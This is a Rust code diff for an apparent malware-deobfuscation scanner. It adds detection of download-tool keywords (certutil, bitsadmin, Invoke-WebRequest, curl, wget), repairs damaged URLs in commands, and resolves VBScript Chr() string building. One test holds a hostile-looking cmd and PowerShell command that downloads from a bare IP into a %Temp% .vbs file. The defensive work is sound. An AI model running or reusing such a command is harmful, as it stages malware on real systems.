@@ -634,16 +634,66 @@ fn command_download_urls(command: &str) -> Vec<String> {
         return Vec::new();
     }
 
+    let download_context =
+        crate::util::contains_ascii_case_insensitive(command, "invoke-webrequest")
+            || crate::util::contains_ascii_case_insensitive(command, "downloadfile")
+            || crate::util::contains_ascii_case_insensitive(command, "downloadstring")
+            || crate::util::contains_ascii_case_insensitive(command, "bitsadmin")
+            || crate::util::contains_ascii_case_insensitive(command, "certutil")
+            || crate::util::contains_ascii_case_insensitive(command, "curl")
+            || crate::util::contains_ascii_case_insensitive(command, "wget");
     let mut urls = Vec::new();
     for token in parts {
         let candidate = token.trim_matches(['"', '\'', '(', ')', '[', ']', '{', '}', ',', ';']);
         if let Some(url) = crate::deob_scan::normalize_liberal_url_token(candidate)
             .or_else(|| crate::deob_scan::normalize_schemeless_domain_path_token(candidate))
+            .or_else(|| repair_damaged_command_url(candidate, download_context))
         {
             urls.push(url);
         }
     }
     urls
+}
+
+fn repair_damaged_command_url(candidate: &str, download_context: bool) -> Option<String> {
+    if !download_context {
+        return None;
+    }
+    let repaired = if crate::util::starts_with_ascii_case_insensitive(candidate, "ttp://")
+        || crate::util::starts_with_ascii_case_insensitive(candidate, "ttps://")
+    {
+        format!("h{candidate}")
+    } else {
+        return None;
+    };
+    let repaired = trim_glued_command_url(crate::deob_scan::trim_url_suffix(&repaired));
+    crate::deob_scan::normalize_liberal_url_token(repaired)
+}
+
+fn trim_glued_command_url(url: &str) -> &str {
+    const EXTENSIONS: &[&str] = &[
+        ".exe", ".dll", ".ps1", ".vbs", ".js", ".jse", ".hta", ".bat", ".cmd", ".msi", ".zip",
+        ".rar", ".7z", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".scr", ".bin", ".dat",
+    ];
+    let lower = url.to_ascii_lowercase();
+    let mut best_end: Option<usize> = None;
+    for ext in EXTENSIONS {
+        let mut search_from = 0usize;
+        while let Some(rel) = lower[search_from..].find(ext) {
+            let end = search_from + rel + ext.len();
+            if end == url.len()
+                || url[end..]
+                    .as_bytes()
+                    .first()
+                    .is_some_and(|b| matches!(*b, b'%' | b'!' | b'\\'))
+            {
+                best_end = Some(best_end.map_or(end, |best| best.min(end)));
+                break;
+            }
+            search_from = end;
+        }
+    }
+    best_end.map_or(url, |end| &url[..end])
 }
 
 fn extract_urldownload_expr_downloads(
@@ -813,13 +863,40 @@ fn collect_vbs_string_bindings(text: &str) -> std::collections::HashMap<String, 
             let (Some(name), Some(value)) = (caps.get(1), caps.get(2)) else {
                 continue;
             };
-            let Some(value) = eval_vbs_string_expr(value.as_str(), &bindings) else {
+            let Some(value) = eval_vbs_assignment_value(name.as_str(), value.as_str(), &bindings)
+            else {
                 continue;
             };
             bindings.insert(name.as_str().to_ascii_lowercase(), value);
         }
     }
     bindings
+}
+
+fn eval_vbs_assignment_value(
+    name: &str,
+    expr: &str,
+    bindings: &std::collections::HashMap<String, String>,
+) -> Option<String> {
+    if let Some(value) = eval_vbs_string_expr(expr, bindings) {
+        return Some(value);
+    }
+
+    let key = name.to_ascii_lowercase();
+    let parts = split_vbs_concat(expr);
+    let first = parts.first()?.trim().trim_matches(['(', ')']);
+    if !first.eq_ignore_ascii_case(name) {
+        return None;
+    }
+
+    let mut out = bindings.get(&key).cloned().unwrap_or_default();
+    let mut saw_appended = false;
+    for part in parts.into_iter().skip(1) {
+        let value = eval_vbs_string_expr(part, bindings)?;
+        out.push_str(&value);
+        saw_appended = true;
+    }
+    saw_appended.then_some(out)
 }
 
 fn vbs_execute_expr(line: &str) -> Option<&str> {
@@ -1372,7 +1449,10 @@ fn reverse_vbs_string(s: &str) -> String {
 
 #[cfg(test)]
 mod tests {
-    use super::{parse_vbs_string_transform, reverse_vbs_string};
+    use super::{
+        collect_vbs_string_bindings, command_download_urls, parse_vbs_string_transform,
+        reverse_vbs_string,
+    };
 
     #[test]
     fn parse_vbs_string_transform_matches_mixed_case_left_and_right() {
@@ -1391,5 +1471,23 @@ mod tests {
     fn reverse_vbs_string_fast_paths_ascii_and_preserves_unicode() {
         assert_eq!(reverse_vbs_string("abcd"), "dcba");
         assert_eq!(reverse_vbs_string("héllo"), "olléh");
+    }
+
+    #[test]
+    fn accumulative_chr_assignment_extends_existing_binding() {
+        let bindings = collect_vbs_string_bindings(
+            "Dim pdf\npdf = pdf + Chr(99)\npdf = pdf + Chr(109)\npdf = pdf + Chr(100)",
+        );
+        assert_eq!(bindings.get("pdf").map(String::as_str), Some("cmd"));
+    }
+
+    #[test]
+    fn command_download_urls_repairs_damaged_scheme_in_download_context() {
+        assert_eq!(
+            command_download_urls(
+                "cmd /c powershell Invoke-WebRequest -Uri ttp://45.88.67.75/pdf/a.pdf%Temp%\\google.vbs",
+            ),
+            vec!["http://45.88.67.75/pdf/a.pdf".to_string()]
+        );
     }
 }
